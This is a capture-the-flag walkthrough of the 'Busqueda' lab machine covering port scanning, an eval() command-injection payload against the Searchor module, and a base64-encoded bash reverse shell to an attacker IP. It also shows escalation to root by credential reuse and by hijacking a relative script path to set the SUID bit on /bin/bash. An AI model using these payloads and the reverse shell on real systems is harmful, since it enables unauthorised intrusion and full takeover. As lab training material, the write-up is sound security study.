---------------
Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user's Gitea account. Further analysis of the system checkup script's source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.208 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn
```

![](/assets/Busqueda/1.png)
<br />
<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.208 -p 22,80 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A
```

![](/assets/Busqueda/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.9p1**
+ **80/tcp Apache httpd 2.4.52**

<br />

We can also see a **hostname**, so we will add it to our ***/etc/hosts* file**:

```bash
echo "10.10.11.208 searcher.htb" | sudo tee --append /etc/hosts
```

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.208 -p 22,80 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn
```

<br />

The scan reports nothing.

<br />

### Foothold

The foothold in this machine is very easy, as there is a [**straightforward script**](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh) that we can use to gain access to the machine, however I prefer to **exploit the vulnerability manually**.

<br />

We are facing a website that combines multiples search engines, this is a **GitHub project named Searchor**:
![](/assets/Busqueda/3.png)
<br />
<br />
<br />

This version of Searchor previously used the `eval()` function in the ***main.py*** file, which we can leverage to **execute commands** in the system:
![](/assets/Busqueda/4.png)
<br />
<br />
<br />

To escape the function and execute commands, we can run a payload like this:

```python
',__import__('os').system('commands')) #
```

<br />

This payload would make the query look like this:

```python
url = eval(
            Engine.Google.search('',__import__('os').system('commands')) #', copy_url={copy}, open_web={open})"
                )
```

<br />

As we can see, we are able to escape the function, we just now have to craft a reverse shell payload and launch it, for that I'm going to use a **base64 payload**:
```bash
echo -n "bash  -c 'bash -i >& /dev/tcp/10.10.16.10/4444 0>&1'" | base64
rlwrap nc -nlvp 4444
```

<br />

The HTTP request would look like this:
```HTTP
engine=Google&query=',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAvNDQ0NCAwPiYxJw==|base64 -d|bash -i')) #
```

<br />
<br />
<br />

Just like this we get the **user flag** in the machine:

<br />
### Privilege Escalation

The privilege escalation is actually complex, because there are a **lot of rabbit holes**, however I'm going to ignore them and go straightforward to the solution.

<br />

First, I created a pair of SSH keys and put my public key in the .ssh/authorized_keys file of the svc user to connect via SSH:
```bash
ssh-keygen
cat "my_public_key" >/home/svc/.ssh/authorized_keys
```

```bash
ssh svc@searcher.htb
```

<br />

Now we can start our enumeration, the first actual clue we can find is enumerating the web application, were we can file a **hidden *.git* directory**:
![](/assets/Busqueda/7.png)
<br />
<br />
<br />

In this directory, we can find **credentials** and a **subdomain** in the ***config*** file:
![](/assets/Busqueda/8.png)
<br />
<br />
<br />

We can **add this subdomain to our /etc/hosts** file and log in, however we will only find an ***administrator*** user:

```bash
echo "10.10.11.208 gitea.searcher.htb" | sudo tee --append /etc/hosts
```

![](/assets/Busqueda/9.png)
<br />
<br />
<br />

Luckily for us, the **password for the user cody is the same as the one for the user svc**, so we can now check the commands we can run using `sudo`:

```bash
sudo -l
```

![](/assets/Busqueda/10.png)
<br />
<br />
<br />

We can try to run this command, just to discover that we are **hosting containers**:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

![](/assets/Busqueda/11.png)
<br />
<br />
<br />

We discover that we are **running two containers**, the gitea one and another for a database:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

![](/assets/Busqueda/12.png)
<br />
<br />
<br />

It seems that we have another command that allow us to **inspect the containers details**, let's get all of the details of the one that contains relevant information, the **mysql_db** one:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq
```

![](/assets/Busqueda/13.png)
<br />
<br />
<br />

We can see some **credentials in the environmental variables**, although the logical procedure would be to take a look at the database, it is a big rabbit hole, however we can use **credentials in the MYSQL_PASSWORD variable to login in the gitea website as administrator**, where we will find a **copy of the script we can run with `sudo`**:

![](/assets/Busqueda/14.png)
<br />
<br />
<br />

We can see that the full-checkup option is trying to **run a bash script in the working directory**, so we can hijack this path:

```bash
echo '#!/bin/bash' > full-checkup.sh
echo "" >> full-checkup.sh
echo "chmod 4755 /bin/bash" >> full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![](/assets/Busqueda/15.png)
<br />
<br />
<br />

Great! We successfully set the **SUID bit** in the /bin/bash binary:
![](/assets/Busqueda/16.png)
<br />
<br />
<br />

Let's **elevate our privileges** and get the **root flag**:
```bash
bash -p
```
![](/assets/Busqueda/17.png)
<br />
<br />
<br />
